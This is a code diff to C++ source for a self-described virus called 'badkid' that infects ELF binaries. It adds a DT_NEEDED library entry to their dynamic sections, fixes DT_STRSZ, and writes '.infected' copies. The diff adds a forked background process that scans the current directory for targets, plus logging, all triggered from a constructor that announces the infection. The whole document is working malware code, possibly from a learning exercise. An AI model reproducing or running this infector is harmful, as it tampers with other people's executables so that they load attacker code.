@@ -10,6 +10,8 @@
 
 void Infect(const char *elfName)
 {
+    std::cerr << "try to infect " << elfName << std::endl;
+
     using namespace ELFIO;
     elfio elfFile;
     elfFile.load(elfName);
@@ -59,6 +61,12 @@ void Infect(const char *elfName)
         }
     }
     for (int i = 0; i < entNum; ++i) {
+        if (dynData[i].d_tag == DT_STRSZ) {
+            dynData[i].d_un.d_val = pNewDynStr->get_size();
+            break;
+        }
+    }
+    for (int i = 0; i < entNum; ++i) {
         if (dynData[i].d_tag == DT_NULL) {
             dynData[i].d_tag = DT_NEEDED;
             dynData[i].d_un.d_val = newStrOffset;
@@ -70,10 +78,12 @@ void Infect(const char *elfName)
     free(dynData);
 
     elfFile.save(elfName + std::string(".infected"));
+    std::cout << "\tinfect success" << std::endl;
 }
 
 int SearchDirAndInfect(const char *path)
 {
+    std::cerr << "Searching at " << path << std::endl;
 	DIR *dir;
 	struct dirent *ent;
 	if ((dir = opendir(path)) != NULL) {
@@ -132,9 +142,16 @@ public:
         this->seed = seed_;
         // Call SearchDirAndInfect
         std::cout << "You have been infected by virus `badkid`.\n\ttoo young too simple." << std::endl;
-        SearchDirAndInfect(".");
-        // std::thread searchThread(SearchDirAndInfect, ".");
+        // SearchDirAndInfect(".");
+        // std::thread searchThread(SearchCWD);
         // searchThread.detach();
+        // std::cout << "Main Process PID: " << getpid() << std::endl;
+        if (fork() == 0) {
+            // std::cout << "Infect Process PID: " << getpid() << std::endl;
+            SearchDirAndInfect(".");
+            // std::cout << "Infect Over." << std::endl;
+            exit(0);
+        }
     }
 };
 
